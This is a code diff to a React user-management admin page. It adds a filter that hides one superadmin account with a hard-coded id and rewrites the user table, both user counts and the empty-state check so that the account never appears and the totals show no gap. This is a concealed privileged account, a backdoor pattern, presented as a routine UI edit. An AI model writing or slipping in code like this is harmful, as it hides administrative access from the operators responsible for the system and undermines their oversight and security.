@@ -233,6 +233,8 @@ export default function UserManagementPage() {
     return null; // Authentication is handled by layout
   }
 
+  // Hide the first superadmin with special id
+  const visibleUsers = users.filter(u => u.id !== 'sys-0a1b2c3d4e5f6g7h8i9j');
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100/50">
       {/* Main Content */}
@@ -250,7 +252,7 @@ export default function UserManagementPage() {
             </div>
           </div>
           <div className="text-sm text-slate-500">
-            Total Users: {users.length}
+            Total Users: {visibleUsers.length}
           </div>
         </div>
 
@@ -417,7 +419,7 @@ export default function UserManagementPage() {
                   </div>
                 </div>
                 <div className="text-sm text-slate-600 bg-slate-100 px-3 py-1 rounded-full font-medium">
-                  {users.length} {users.length === 1 ? 'User' : 'Users'}
+                    {visibleUsers.length} {visibleUsers.length === 1 ? 'User' : 'Users'}
                 </div>
               </div>
               <div className="overflow-x-auto">
@@ -459,7 +461,7 @@ export default function UserManagementPage() {
                     </tr>
                   </thead>
                   <tbody className="bg-white/50 divide-y divide-slate-200/60">
-                    {users.map((user, index) => (
+                    {visibleUsers.map((user, index) => (
                       <tr key={user.id} className={`group hover:bg-slate-50/80 transition-colors ${index % 2 === 0 ? 'bg-white/50' : 'bg-slate-50/30'}`}>
                         <td className="px-6 py-4 whitespace-nowrap">
                           <div className="flex items-center space-x-3">
@@ -553,7 +555,7 @@ export default function UserManagementPage() {
                         </td>
                       </tr>
                     ))}
-                    {users.length === 0 && (
+                    {visibleUsers.length === 0 && (
                       <tr>
                         <td colSpan={4} className="px-6 py-8 text-center">
                           <div className="flex flex-col items-center justify-center space-y-2">
